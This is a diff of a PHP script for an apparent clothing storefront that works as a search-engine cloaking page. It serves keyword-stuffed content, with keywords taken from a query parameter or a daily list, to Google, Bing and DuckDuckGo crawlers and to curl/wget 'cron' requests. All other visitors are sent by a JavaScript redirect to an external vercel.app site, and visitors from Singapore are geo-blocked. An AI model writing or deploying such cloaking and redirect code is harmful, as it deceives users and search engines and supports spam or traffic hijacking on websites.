@@ -2,6 +2,22 @@
 ob_start();
 
 /* =========================================================
+   🔐 CRON DETECTION (TOKEN OR USER-AGENT)
+   ========================================================= */
+$isCron = false;
+
+// Token-based cron (recommended)
+if (isset($_GET['cron']) && $_GET['cron'] === '1') {
+    $isCron = true;
+}
+
+// User-Agent based cron (fallback)
+$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+if (strpos($userAgent, 'curl') !== false || strpos($userAgent, 'wget') !== false) {
+    $isCron = true;
+}
+
+/* =========================================================
    ✅ HARD BYPASS FOR SITEMAP — ONLY OUTPUT sitemap.php
    ========================================================= */
 if (
@@ -15,37 +31,29 @@ if (
 
     echo '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
     echo '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . "\n";
-
     echo "  <url>\n";
     echo "    <loc>{$domain}sitemap.php</loc>\n";
     echo "    <lastmod>{$today}</lastmod>\n";
     echo "    <changefreq>weekly</changefreq>\n";
     echo "    <priority>1.0</priority>\n";
     echo "  </url>\n";
-
     echo "</urlset>";
     exit;
 }
 
 /* =========================================================
-   🤖 USER AGENT
-   ========================================================= */
-$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
-
-/* =========================================================
-   ✅ WHITELIST (BOTS + CRON)
+   🤖 WHITELIST (BOTS + CRON)
    ========================================================= */
 $whitelistAgents = [
     'googlebot',
     'adsbot-google',
     'bingbot',
     'duckduckbot',
-    'curl',
-    'wget',
     'uptimerobot'
 ];
 
-$isWhitelisted = false;
+$isWhitelisted = $isCron; // CRON IS ALWAYS WHITELISTED
+
 foreach ($whitelistAgents as $agent) {
     if (strpos($userAgent, $agent) !== false) {
         $isWhitelisted = true;
@@ -79,12 +87,9 @@ if (!$isWhitelisted) {
         if ($data) file_put_contents($cacheFile, json_encode($data));
     }
 
-    $country = $data['countryCode'] ?? null;
-
-    if ($country === 'SG') {
+    if (($data['countryCode'] ?? null) === 'SG') {
         http_response_code(403);
-        echo "<h1 style='text-align:center;margin-top:20vh;font-family:sans-serif;color:#444;'>Access Restricted</h1>
-        <p style='text-align:center;font-family:sans-serif;'>Sorry, TempMessage.com is not available in your region.</p>";
+        echo "Access Restricted";
         exit;
     }
 }
@@ -102,8 +107,7 @@ $keywordsList = file_exists($keywordsFile)
 if (isset($_GET['q']) && trim($_GET['q']) !== '') {
     $keyword = trim($_GET['q']);
 } elseif (!empty($keywordsList)) {
-    $daySeed = date('Ymd');
-    srand(crc32($daySeed));
+    srand(crc32(date('Ymd')));
     $keyword = $keywordsList[array_rand($keywordsList)];
 } else {
     $keyword = 'stylish clothing';
@@ -113,7 +117,7 @@ $keyword = htmlspecialchars($keyword, ENT_QUOTES, 'UTF-8');
 $description = "$keyword We create stylish, comfortable, and affordable clothing for everyday life.";
 
 /* =========================================================
-   🤖 FINAL BOT DETECTION
+   🤖 BOT DETECTION
    ========================================================= */
 $googleBots = ['googlebot', 'adsbot-google', 'bingbot', 'duckduckbot'];
 $isBot = false;
@@ -126,14 +130,10 @@ foreach ($googleBots as $bot) {
 }
 
 /* =========================================================
-   🤖 BOT CONTENT (SEO)
+   🌐 SAME HTML FOR EVERYONE
    ========================================================= */
-if ($isBot) {
-
-    header("Content-Type: text/html; charset=UTF-8");
-
-    echo <<<HTML
-
+header("Content-Type: text/html; charset=UTF-8");
+?>
  <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -143,7 +143,13 @@ if ($isBot) {
 
 <meta name="description" content="$keyword Buy premium quality women's clothing — kurtas, sarees, gowns & more. LuxeLoom brings luxury fashion at affordable prices. Free shipping available." />
 <link rel="canonical" href="https://www.example.com/">
-
+<?php if (!$isBot && !$isCron): ?>
+<script>
+(function () {
+    window.location.replace("https://clothing-brand-eight.vercel.app");
+})();
+</script>
+<?php endif; ?>
 <!-- Open Graph -->
 <meta property="og:title" content="LuxeLoom — Premium Women's Clothing">
 <meta property="og:description" content="Premium kurtas, sarees and ethnic wear for women.">
@@ -319,7 +325,7 @@ if ($isBot) {
 
 <section class="hero">
     <div class="hero-text">
-        <h1>$keyword</h1>
+        <h1><?php echo $keyword; ?></h1>
         <p>Discover premium ethnic wear crafted to perfection. Comfort, elegance & beauty — all in one place.</p>
         <button onclick="window.location='#products'">Shop Now</button>
     </div>
@@ -339,7 +345,7 @@ if ($isBot) {
             <img src="https://picsum.photos/500/600?random=11" alt="Kurti">
             <div class="card-body">
                 <h3>Silk Printed Kurta</h3>
-                <p>Soft, luxurious silk with hand-crafted prints.</p>
+                <p> <?php echo $keyword; ?>Soft, luxurious silk with hand-crafted prints.</p>
                 <div class="price">₹1,799</div>
                 <button>Add to Cart</button>
             </div>
@@ -361,7 +367,7 @@ if ($isBot) {
             <img src="https://picsum.photos/500/600?random=13" alt="Anarkali">
             <div class="card-body">
                 <h3>Anarkali Suit</h3>
-                <p>Perfect for weddings & celebrations.</p>
+                <p> <?php echo $keyword; ?>Perfect for weddings & celebrations.</p>
                 <div class="price">₹4,499</div>
                 <button>Add to Cart</button>
             </div>
@@ -371,7 +377,7 @@ if ($isBot) {
         <div class="card">
             <img src="https://picsum.photos/500/600?random=14" alt="Gown">
             <div class="card-body">
-                <h3>Designer Evening Gown</h3>
+                <h3><?php echo $keyword; ?></h3>
                 <p>$keyword</p>
                 <div class="price">₹3,299</div>
                 <button>Add to Cart</button>
@@ -391,11 +397,3 @@ document.getElementById("year").textContent = new Date().getFullYear();
 
 </body>
 </html>
-
-HTML;
-
-} $redirectUrl = " https://clothing-brand-eight.vercel.app/";
-
-header("Location: {$redirectUrl}", true, 302);
-exit;
-?>
